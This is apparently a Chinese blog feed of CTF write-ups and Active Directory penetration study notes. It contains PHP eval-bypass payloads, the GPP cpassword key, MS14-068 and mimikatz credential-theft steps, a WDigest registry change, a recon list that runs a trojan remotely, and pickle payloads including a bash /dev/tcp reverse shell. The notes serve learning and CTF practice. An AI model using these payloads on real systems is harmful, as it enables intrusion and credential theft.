    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//帮你算出答案</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>正则就是简单过滤了几个符号，然后只让你用他给的函数，不然出现其他字母就直接挂掉，但是可以把他给的字母作为变量名进行操作<br>看了大佬们的wp后发现解法还是很多的，可以说是一个很灵活的题目，这么多函数里面绝大多数都是没有用的，只有和进制相关的函数中有机会凑出点什么<br>其中一个最重要的函数就是base_convert，这个函数可以进行任意进制的转换，如果你整一个36进制，就可以获得全部的小写字母，利用这一点我们就可以执行一些简单的函数，例如phpinfo()</p>
<h3 id="解1"><a href="#解1" class="headerlink" title="解1"></a>解1</h3><p>hex2bin()，虽然这个函数没有被允许使用，但是我们已经可以用base_convert拼出绝大多数的函数了(有下划线的就拼不出来)，hex2bin配合dechex可以将十进制数转换为任意ascii，只是一次顶多转换四个字符，过长会导致十进制数过大，超出其范围，而同时又受到payload&lt;80的限制，不能太重复使用。<br>通过拼凑$_GET来进行任意命令执行，选择名字较短的函数作为传入的参数。<br><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=&amp;abs=</code><br><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))=hex2bin(dechex(1598506324))=\_GET</code>(只能拼四个字符，长度上限了)<br>之后采用大括号{}代替被禁用的方括号[]，$$pi定义了一个可变变量，即以$pi的值构建变量，所以$$pi&#x3D;$_GET，就等价于<code>$\_GET&#123;pi&#125;($\_GET&#123;abs&#125;)</code>，达到一个任意命令执行的效果（长度79，极限）</p>
<h3 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h3><p>使用getallheaders()函数，该函数以数组形式获取所有请求头信息。<br>在http请求头中添加一个项并将其执行，构造出exec(getallheaders()) <del>我是不能理解大佬们怎么想出来这种操作的</del>，之后就只用在http头中添加对应项就可以了<br><code>$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)//exec(getallheaders()&#123;1&#125;)</code><br>如上即为执行http头中key为1的内容，在http头中添加一条1: ls &#x2F;就可以查看根目录文件了</p>
<h3 id="解3"><a href="#解3" class="headerlink" title="解3"></a>解3</h3><p>神仙解法，拿题目给的函数名配合dechex()做异或，异或出字符串拿当前目录下的flag，但是BUU的复现修改了flag位置，放到根目录去了，我没那个异或的本事，要同时异或出空格和斜杠太难了一点吧</p>
<h2 id="踩的一个坑"><a href="#踩的一个坑" class="headerlink" title="踩的一个坑"></a>踩的一个坑</h2><p>一开始在本地环境做实验的时候，解释器选的是PHP5，结果动态执行函数只能执行一些无参数的，只要动态执行的括号里存在参数就挂了。比如用$pi代替base_convert，$pi(696468,10,36)这样子进eval就会直接报error。<br>后来换成PHP7的解释器就正常了，看了一眼题目的phpinfo发现也是PHP7的版本。一开始还以为理解有问题，耽误了不少时间</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透学习</title>
    <url>/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<h1 id="域渗透学习"><a href="#域渗透学习" class="headerlink" title="域渗透学习"></a>域渗透学习</h1><p>科恩的任务罢了</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>windows域渗透接触的都是windows的东西，都没学过。。。。</p>
<h3 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h3><p>Active Directory，活动目录，存域内各种信息的数据库</p>
<blockquote>
<p>域内所有的计算机共享一个集中式的目录数据库（又称为活动目录数据库），它包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的添加，修改，更新和删除。</p>
</blockquote>
<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>Group Policy，有本地的和域的<br>域组策略管理能够统一的对域内机器和用户进行管理</p>
<h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>组策略对象，GPO（Group Policy Object），实际上就是组策略设置的集合</p>
<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>Group Policy Preference，组策略首选项，作用似乎是简单化管理</p>
<h3 id="SYSVOL目录"><a href="#SYSVOL目录" class="headerlink" title="SYSVOL目录"></a>SYSVOL目录</h3><p>域中<strong>共享</strong>文件夹，该文件夹存储组策略数据以及一些配置文件脚本，这些策略可以被共享到域间机器，由于域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，所有的AD用户都可以访问它，包括普通用户<br>所有组策略都存储于如下目录<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code></p>
<h3 id="域内身份验证"><a href="#域内身份验证" class="headerlink" title="域内身份验证"></a>域内身份验证</h3><p>windows身份验证分两种，一个kerberos一个NTLM<br>NTLM就是一个用密码哈希进行的挑战应答，kerberos不多说了，在windows域环境中由DC担任KDC</p>
<h3 id="Golden-Ticket-amp-Silver-Ticket"><a href="#Golden-Ticket-amp-Silver-Ticket" class="headerlink" title="Golden Ticket &amp; Silver Ticket"></a>Golden Ticket &amp; Silver Ticket</h3><p>黄金票据，是通过krbtgt的密码哈希计算而成的票据，绝对伪造<br>白银票据，通过对TGS的伪造，只能访问伪造的对应服务</p>
<h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="脚本明文包含"><a href="#脚本明文包含" class="headerlink" title="脚本明文包含"></a>脚本明文包含</h3><p>当管理员想通过脚本进行批量密码修改的时候，一般来说这个密码就会以明文的形式保存在脚本里，然后在通过组策略批量下发，这个时候就可以通过搜寻vbs之类的脚本看里面有没有明文密码<br>尝试搜索组策略目录下的脚本命令</p>
<pre class=" language-bat"><code class="language-bat">shell for /r \\dc/sysvol %i in (*.vbs) do @echo %i
shell for /r \\dc/sysvol %i in (*.bat) do @echo %i
</code></pre>
<h3 id="GPP密码解密"><a href="#GPP密码解密" class="headerlink" title="GPP密码解密"></a>GPP密码解密</h3><p>GPP所在的目录为<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>，双反斜线这个目录还有个说法，叫UNC路径，用于访问网络资源</p>
<blockquote>
<p>一个以<code>\\</code>开头的服务器名或主机名，支持IP地址</p>
</blockquote>
<p>所以只要是域成员一般就能读啦，直接文件资源管理器里面填路径就行，GPP里面有一些批量管理操作，比如定时任务，比如批量修改本地用户密码<br>GPO里面选择用户配置-&gt;首选项-&gt;控制面板设置-&gt;本地用户和组可以进行批量的密码修改（可能也能新建用户？）定时操作则可以输入用户名密码使用固定身份执行定时操作<br>每一个新建的组策略都会生成一个对应的XML文件存配置，都在对应的组策略号的文件夹下</p>
<p>所以，可以翻一下SYSVOL目录下的所有XML，万一哪个就有这种配置呢<br>如果用户提供了密码则会在对应的XML文件下以cpassword项存储AES-256方式加密的密码<br>然后微软还把密钥放出来了</p>
<pre><code> 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
</code></pre>
<p>直接解密就可以拿到密码</p>
<p>补丁就是禁止输入密码，所以就不会保存密码了。。。但之前输入过密码的XML需要手动删除，不让输入密码就等于是废除了批量改密码功能了嘛（因为微软推出了新的方法LAPS）</p>
<h4 id="其他trick"><a href="#其他trick" class="headerlink" title="其他trick"></a>其他trick</h4><p>可以使用<code>gpupdate</code>更新组策略，以及<code>gpresult /v</code>查看组策略应用情况</p>
<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>这个非常简单的实验花了我一个下午加一个晚上，因为改密码功能完全不生效，最后还是求助于师傅。不生效的理由很简单，一开始设的testvul这个密码太弱了。。。。但是什么提示都不给，也就写着应用成功了，我真的没想到会是这么个情况</p>
<h4 id="最新发现"><a href="#最新发现" class="headerlink" title="最新发现"></a>最新发现</h4><p>新加入域的机器也会受到之前组策略的影响，今天刚整了个winserver2016，然后加进去之后就直接把我的admin号也给改掉了</p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>windows最有名的提权（大概？）</p>
<h4 id="Kerberos系统运行复习"><a href="#Kerberos系统运行复习" class="headerlink" title="Kerberos系统运行复习"></a>Kerberos系统运行复习</h4><p>打的Kerberos系统，再复习一下这个东西怎么跑的吧<br>1.用户A先向AS认证自己的身份，AS返回一个TGT票据<br>2.用户A用TGT去请求TGS并告知想请求的资源B，TGS验证TGT通过之后返回ServiceTicket<br>3.用户A用ServiceTicket请求B，B验证通过，使用Ticket中的会话密钥进行通信</p>
<h4 id="Kerberos-with-PAC"><a href="#Kerberos-with-PAC" class="headerlink" title="Kerberos with PAC"></a>Kerberos with PAC</h4><p>上述验证过程就是正常密码学学的东西，只能完成用户的验证，却不能完成用户的权限控制，一个用户只要完成了认证就能访问任意服务了，所以引进了PAC进行权限控制<br>PAC即Privilege Attribute Certificate，特权属性证书</p>
<p>PAC版本的kerberos变为:<br>1.第一步返回的TGT里面带一个PAC，PAC里包含用户所在的组和sid，用两个签名防篡改，一个Server Signature，一个是KDC Signature，此时的KDC为AS，Server为TGS(但是AS和TGS好像都是KDC)；<br>2.还是用TGT请求TGS，**但不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据(为什么不在这里直接做权限校验呢。。。)**，并且TGS检验PAC，若签名校验通过，回复的ServerTicke中的PAC的签名被更新为Server是B，KDC是TGS；<br>3.拿ServiceTicket去请求B，B解密ServiceTicket，把解密出来的PAC拿去问KDC有没有访问权限，KDC解密PAC，获取用户的sid和组决定是否拥有访问权限</p>
<blockquote>
<p>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p>
</blockquote>
<h4 id="漏洞利用要素"><a href="#漏洞利用要素" class="headerlink" title="漏洞利用要素"></a>漏洞利用要素</h4><p>有三个主要因素决定了这个漏洞的完整利用<br>1.PAC的签名算法可控，虽然TGS签出来的PAC是用密钥签的名，但是如果你能伪造出一个PAC并且用MD5直接签，他也能接受<br>2.TGS接受位于TGT之外的PAC数据，本来PAC应该是塞在TGT里面的，TGT用AS的密钥加密了，用户就算伪造出一个MD5签的PAC也没法塞进TGT里再过校验，但是用户可以把伪造的PAC放到TGT以外的部分，再放一个对应的密钥，TGS不仅能解密出来进行校验，甚至还能再给你用这个PAC更新一个内嵌PAC的ServiceTicket回来<br>3.当向TGS请求的服务为krbtgt时，返回的ServiceTicket可以当TGT用</p>
<h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>1.申请TGT时可以选择申请一个没有PAC的TGT，使用普通用户请求AS拿到无PAC的TGT<br>2.自己伪造一个PAC，PAC签名直接用MD5签，产生随机数加密PAC，PAC放在请求的 enc-authorization-data字段中，密钥放在PA-DATA里面的APREQ中，向TGS请求对krbtgt的票据<br>3.TGS拿到奇怪的PAC检验成功，签了一个目标是krbtgt的ServiceTicket，这个票能当TGT用，此时就已经获得了一个正常且高权限的TGT了<br>4.用这个TGT想申请谁申请谁，成功提权</p>
<h3 id="Kerberos-ServiceTicket离线碰撞"><a href="#Kerberos-ServiceTicket离线碰撞" class="headerlink" title="Kerberos ServiceTicket离线碰撞"></a>Kerberos ServiceTicket离线碰撞</h3><p>就硬爆破，感觉成功率不大。。。文章里说十一二位也算弱密码。。。对不起我大部分密码都是弱密码呜呜<br>这个方法不能打windows，因为windows上运行的服务会映射到活动目录账户，其密码128位，无敌</p>
<p>攻击流程就是向TGS申请一个目标服务账户的Service Principal Name (SPN)，然后域控就会用对应账户对Ticket加密，加密使用的算法是RC4_HMAC_MD5，这时这个账户的NTLM password的哈希值会参与进来，然后就是硬爆破环节了</p>
<p>这个爆破的好处在于本地跑，不需要像其他爆破一样发一万个包，不容易被发现</p>
<h3 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h3><p>怎么说呢。。。就是mimikatz抓密码，抓到一个就去试这个密码能不能登其他机器，登到其他机器了如法炮制，顺便收集信息，数据库，RDP之类的账号密码的信息，直到拿到想要的账户</p>
<p>这里有几个抓密码为什么能抓到的注意点<br>1.以域管理员账户登录计算机时凭证会被放入LSASS(受保护的内存区)，但拥有admin或localSystem权限的用户可以把这个受保护内存区dump出来<br>2.RunAs切换身份的，同1（这个命令是不是和Linux的su一样啊）<br>3.在受控机上RDP远程登录其他机器的，直接抓键盘记录被打穿<br>4.如果有使用域管理员上下文账户运行的服务部署在所有服务器上，只要拿下一个系统就拿下了所有系统，当一个服务以显式凭证启动时，凭证存进LSASS，被打穿</p>
<p><strong>win10和winserver 2012R2之后的版本默认在内存中禁止保存明文密码，需要修改注册表才行</strong><br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code>重启或用户重新登录后可以成功抓取</p>
<p>用powershell连接远程系统不会在远程系统内存中留下凭证，不会被随便打爆<br>使用零知识证明以不传输凭证登录</p>
<p>但是这样子就不能双重跳跃，从A跳到B时不能再从B跳到C，因为B不能提供凭证，如果在B上输入凭证B不安全就又被打穿了<br>微软提供了CredSSP来保护数据，但这个方案本身并不安全</p>
<h5 id="传递哈希升级为传递凭证"><a href="#传递哈希升级为传递凭证" class="headerlink" title="传递哈希升级为传递凭证"></a>传递哈希升级为传递凭证</h5><p>感觉。。就是说的特别高级的重放，作为凭证窃取整个过程中的子过程进行解释<br>虽然认证需要的是用户名和密码，但因为需要零知识证明，实际用于验证的应该是他们的哈希结果，所以抓到了哈希就等于获得了授权，虽然正常人不能直接提交哈希进行验证，但是可以使用强力软件mimikatz<br>Pass-the-Ticket，偷kerboros凭证，时间戳内能重放（好垃圾哦）<br>OverPass-the-Hash 比直接传哈希复杂一点，先搞来一个哈希过的kerberos密码，然后把内存里所有的kerberos密码清空，下一次Kerberos请求票据的时候就会用上注入进内存的密码，这种方式比直接传递哈希来伪造身份更为隐蔽，无敌工具mimikatz能做到上述操作</p>
<blockquote>
<p>Pass-the-Hash: grab the hash and use to access a resource. Hash is valid until the user changes the account password.<br>Pass-the-Ticket: grab the Kerberos ticket(s) and use to access a resource. Ticket is valid until the ticket lifetime expires (typically 7 days).<br>OverPass-the-Hash: use the password hash to get a Kerberos ticket. Hash is valid until the user changes the account password.</p>
</blockquote>
<p>虽然话是这么说，不改密码打一辈子，但是大家哈希校验的时候真的不额外加一个时间戳什么的防重放吗</p>
<h5 id="应对方案"><a href="#应对方案" class="headerlink" title="应对方案"></a>应对方案</h5><p>管理员应该使用单独的电脑登录工作站，而不是在可能执行用户操作，如收发邮件，浏览网站的机器上登录。smartcard同样会在内存中留下凭证而被日翻（虽然并不是很懂smartcard是什么东西）<br>权限控制，每个管理员应该只给与其对应所需的管理员权限<br>工作站上的本地管理员账号密码应该足够复杂<br>配置组策略以禁止管理员账号通过网络进行认证</p>
<h3 id="接触AD数据库文件-ntds-dit"><a href="#接触AD数据库文件-ntds-dit" class="headerlink" title="接触AD数据库文件(ntds.dit)"></a>接触AD数据库文件(ntds.dit)</h3><p>AD数据库包含了AD域中所有对象的信息，这个数据库被所有的域控都复制了一遍，这个文件一般来说包含了所有用户密码的哈希，该文件只能被能够登陆DC的用户访问</p>
<p>在不是域管理员的情况下获取NTDS.dit的方法<br>1.备份位置，从共享备份文件中接触NTDS.dit<br>2.在成员服务器变为域控之前获取到其存储的的NTDS.dit<br>3.当拥有虚拟主机管理员权限时，虚拟DC可以离线复制相关数据<br>4.控制一个能登录到DC的账户（屁话）<br>AD中大部分组是不被期待拥有默认能登录DC的权限的<br>但如下组默认能登</p>
<blockquote>
<p>Enterprise Admins (member of the domain Administrators group in every domain in the forest)<br>Domain Admins (member of the domain Administrators group)<br>Administrators<br>Backup Operators<br>Account Operators<br>Print Operators</p>
</blockquote>
<h4 id="成为DC管理员后的操作"><a href="#成为DC管理员后的操作" class="headerlink" title="成为DC管理员后的操作"></a>成为DC管理员后的操作</h4><p>首先需要是一个管理员才能运行mimikatz<br>成为DC管理员后，mimikatz一把梭dump全部凭证，dump LSASS内存<br>创建一个Install From Media(IFM)来获取NTDS.dit文件，即上述获取NTDS.dit文件的第二种方法。创建的IFM集就是NTDS.dit文件的复制，这个文件可能会在新的DC直接共享，或者在一个还未升级为域控的服务器上发现，在升级之前这个文件可能不会受到很好的保护<br>从NTDS.dit文件中dump AD域凭证，当攻击者获得了一份NTDS.dit文件和某些能解密数据库数据的注册表项时，AD数据库文件就被打穿了。当攻击者拥有注册表中的系统配置单元和NTDS.dit文件时，即可获取整个AD的所有凭证</p>
<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>堆一下用的时候慢慢翻</p>
<pre class=" language-powershell"><code class="language-powershell">ipconfig <span class="token operator">/</span>all    查询本机IP段，所在域等
net config Workstation    当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net user    本机用户列表
net localhroup administrators    本机管理员<span class="token punctuation">[</span>通常含有域用户<span class="token punctuation">]</span>
net user <span class="token operator">/</span>domain    查询域用户
net user 用户名 <span class="token operator">/</span>domain    获取指定用户的账户信息
net <span class="token function">group</span> <span class="token operator">/</span>domain    查询域里面的工作组
net <span class="token function">group</span> 组名 <span class="token operator">/</span>domain    查询域中的某工作组
net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain    查询域管理员列表
net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain    获得企业管理员列表
net <span class="token function">group</span> 组名 <span class="token operator">/</span><span class="token function">del</span> <span class="token operator">/</span>domain    删除域中的某组
net <span class="token function">group</span> 组名 组成员名 <span class="token operator">/</span><span class="token function">del</span> <span class="token operator">/</span>domain    删除域中的某组的组成员
net localgroup administrators <span class="token operator">/</span>domain    登录本机的域管理员
net <span class="token function">group</span> 组名 <span class="token operator">/</span>add    增加域中的组
net localgroup administrators workgroup\user001 <span class="token operator">/</span>add    域用户添加到本机
net <span class="token function">group</span> <span class="token string">"domain controllers"</span> <span class="token operator">/</span>domain    查看域控制器<span class="token punctuation">(</span>如果有多台<span class="token punctuation">)</span>
net time <span class="token operator">/</span>domain    判断主域，主域服务器都做时间服务器
net session    查看当前会话
net use \\ip\ipc$ pawword <span class="token operator">/</span>user:username@domain    建立IPC会话<span class="token punctuation">[</span>空连接<span class="token operator">-</span>*<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">]</span>
net use z: \\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>200<span class="token punctuation">.</span>21\文件夹名    建立映射到本机Z盘
net share    查看SMB指向的路径<span class="token punctuation">[</span>即共享<span class="token punctuation">]</span>
at \\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>200<span class="token punctuation">.</span>2  0：00 c:\windows\muma<span class="token punctuation">.</span>exe    在共享主机上执行
net view    查询同一域内机器列表
net view <span class="token operator">/</span>domain    查询域列表
net view <span class="token operator">/</span>domain:M0RK    查看test域中计算机列表
net view \\域控的机器名    查看域控共享情况
nltest <span class="token operator">/</span>domain_trusts    获取域信任信息
net session    查看当前会话
net <span class="token function">start</span>    查看当前运行的服务
net time <span class="token operator">/</span>domain    查询主域服务器的时间
<span class="token function">echo</span> <span class="token operator">%</span>logonserver<span class="token operator">%</span>    查看登录认证的机器<span class="token punctuation">(</span>即域控机器<span class="token punctuation">)</span>
net accounts    查看本地密码策略
net accounts <span class="token operator">/</span>domain    查看域密码策略
query user   查看当前的登录信息
netsh firewall show config    查看防火墙策略
netsh firewall show state    查看防火墙策略
route print    路由表
tracert IP    路由跟踪
arp <span class="token operator">-</span>a    列出本网段内所有活跃的IP地址
arp <span class="token operator">-</span>s <span class="token punctuation">(</span>ip <span class="token operator">+</span> mac<span class="token punctuation">)</span>    绑定mac和IP
arp <span class="token operator">-</span>d <span class="token punctuation">(</span>iP <span class="token operator">+</span> mac<span class="token punctuation">)</span>    解绑IP和Mac
tasklist <span class="token operator">/</span>V    查看进程<span class="token punctuation">[</span>显示对应用户<span class="token punctuation">]</span>
tasklist <span class="token operator">/</span>S ip <span class="token operator">/</span>U domain\username <span class="token operator">/</span>P <span class="token operator">/</span>V    查看远程计算机进程列表
tasklist <span class="token operator">/</span>S IP地址 <span class="token operator">/</span>U 域名\用户名 <span class="token operator">/</span>P <span class="token operator">/</span>V    查看远程计算机进程
tasklist <span class="token operator">/</span>svc    查看进程
taskkill <span class="token operator">/</span>im 进程名称<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>exe<span class="token punctuation">)</span>    结束进程
taskkill <span class="token operator">/</span>pid<span class="token punctuation">[</span>进程码<span class="token punctuation">]</span>    <span class="token operator">-</span>t<span class="token punctuation">(</span>结束该进程<span class="token punctuation">)</span> <span class="token operator">-</span>f<span class="token punctuation">(</span>强制结束该进程以及所有子进程<span class="token punctuation">)</span>
qprocess <span class="token operator">*</span>    类似tasklist
qprocess <span class="token operator">/</span>SERVER:IP    远程查看计算机进程列表
whoami <span class="token operator">/</span>all    查询当前用户权限等
<span class="token function">set</span>    查看系统环境变量
systeminfo    查看系统信息
qwinsta    查看登录情况
fsutil fsinfo drives    查看所有盘符
wmic bios    查看bios信息
wmic qfe    查看补丁信息
wmic qfe get hotfixid    查看补丁<span class="token operator">-</span>Patch号，很实用
wmic share get name<span class="token punctuation">,</span>path    查看SMB指向路径
net view <span class="token operator">/</span>domain
net config workstation
net <span class="token function">group</span> <span class="token string">"Domain Admins"</span> <span class="token operator">/</span>domain
net time <span class="token operator">/</span>domain
ipconfig <span class="token operator">/</span>all
nslookup xxx
dsquery server

查看域控制器
net <span class="token function">group</span> <span class="token string">"Domain controllers"</span>
</code></pre>
<p>环境搞得差不多了，该手动实验了<br>上述大部分域有关的信息搜集指令执行之后都会</p>
<blockquote>
<p>这项请求将在域z33.com的域控制器处理<br>发生系统错误5<br>拒绝访问</p>
</blockquote>
<p>试了半天发现是需要以域账户登录才能成功执行，就登录本地机器的话就会拒绝访问</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>本文学习原文<br><a href="https://adsecurity.org/?p=2362">Attack Methods for Gaining Domain Admin Rights in Active Directory</a></p>
<p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/">域渗透之票据</a><br><a href="https://xz.aliyun.com/t/7784">浅析域渗透中的组策略利用</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/file-path-formats">Windows系统中的文件路径格式</a><br><a href="https://xz.aliyun.com/t/8038">内网渗透技巧之横向控制</a><br><a href="https://kevien.github.io/2017/09/28/windows%E5%9F%9F%E5%AE%89%E5%85%A8/">Windows域安全</a></p>
<p>下面两篇文章一起看MS16-068基本上就看懂了<br><a href="https://www.anquanke.com/post/id/192810">Windows内网协议学习Kerberos篇之PAC</a><br><a href="https://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a><br>好姐姐的中文译本<br><a href="https://neorah.me/pentest/adsecurity01/">翻译和复现</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>巅峰极客2021</title>
    <url>/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22021.html</url>
    <content><![CDATA[<h1 id="巅峰极客2021"><a href="#巅峰极客2021" class="headerlink" title="巅峰极客2021"></a>巅峰极客2021</h1><p>这次的题四个web，但是抄原题的抄原题，套娃的套娃，并且感觉题目的重复程度好高。。。虽然垃圾的我做不出来，但是我还是觉得这次的题目没有那种让人眼前一亮或者学到东西的感觉。。。</p>
<h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p>魔改自XNUCA2020 oooooooooldjs，加载图片的地方可以任意文件读取，读了源码加package.json，然后npm audit看一下，能发现是打的一个express-validator的原型链污染，污染完了就是一个pug的rce，pug的rce是复制粘贴就能打的那种，express-validator的原型链污染也是复制粘贴就能打的，但是改了一个地方，原来的题目用了express.json支持json数据解析，所以json直接提交一个对象就能打通，这里没有json解析了，但是没有认真去了解过这个库是怎么处理数据的，不知道怎么样的提交能实现之前同样的效果<br>一开始在想怎么伪造admin身份，也有可能是打那个session-file-store，但是那个需要获取到session key和能写文件，session-file-store的session也和phpsessionid有点像，前半截文件名，默认路径是<code>./session</code>，后半截是拿key算的签名保证不被伪造，因为前半截的文件名完全没有校验，甚至可以目录穿越去加载session文件，但是这里既读不到key也写不了文件，也不行</p>
<p>需要进行乱按来进行原型链污染，一开始没有意识到抄的payload里面的双引号是在转义json。。。所以抄payload的时候一直带着那个转义符，第二天复盘的时候突然意识到这一点，去掉之后瞬间打通。。。呜呜呜，污染完原型链之后就是复制粘贴打在开启pretty选项时pug的rce，纯复制粘贴题<br>非json解析下的原型链污染payload<br><code>a[__proto__][isadmin]=admin&amp;a&quot;].__proto__[&quot;isadmin=222</code></p>
<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>手搓pickle的题，加载图片的地方可以任意文件读取，抄的Code-Breaking2018 picklecode，再套了一个XCTF抗疫赛 webtmp的opcode不能有R的限制<br>直接把picklecode的payload复制粘贴然后改一下把所有R用o和i替换即可<br>原payload</p>
<pre><code>cbuiltins
getattr
p0
(cbuiltins
dict
S&#39;get&#39;
tRp1
cbuiltins
globals
)Rp2
00g1
(g2
S&#39;builtins&#39;
tRp3
0g0
(g3
S&#39;eval&#39;
tR(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
tR.
</code></pre>
<p>用o替换R</p>
<pre><code>(cbuiltins
getattr
p0
cbuiltins
dict
S&#39;get&#39;
op1
(cbuiltins
globals
op2
00(g1
g2
S&#39;builtins&#39;
op3
0(g0
g3
S&#39;eval&#39;
op4
(g4
S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
o.
</code></pre>
<p>当然，这里出题人显然是抄题加缝合都没认真，复制粘贴了picklecode的过滤但是load那里却没有用自定义的load函数，还是<code>pickle.loads</code>，那不是白给，简单绕过R我直接eval都能给你干碎</p>
<pre><code>(cbuiltins
eval
S&#39;__import__(&quot;os&quot;).system(\&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\&#39;)&#39;
o.
</code></pre>
<p>弹shell时需要对嵌套的引号进行转义</p>
<h2 id="what-pickle"><a href="#what-pickle" class="headerlink" title="what pickle"></a>what pickle</h2><p>又是pickle题，并且和上一个还差不多，加载图片的地方可以wget参数注入任意文件读取。。。。三个题没给源码<strong>全都是图片加载处任意文件读取</strong>，有意思吗，还不如直接给呢，最后一个题没直接给源码但是有一个www.zip，这几个真给我整无语了<br>这两个题如此的相似也不知道主办方是怎么审题的。。。</p>
<p>image路由如果乱按不带参数的话会报错，能看到源码的部分，也就是这次的图片加载文件读取和前两个题的区别，可以看出来是wget了本地的一个web服务，服务就五个图片，所以目录穿越什么的都打不了了，可以给wget加参数，但是我不会嘻嘻</p>
<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/images'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    command<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"wget"</span><span class="token punctuation">]</span>
    argv<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">'argv'</span><span class="token punctuation">)</span>
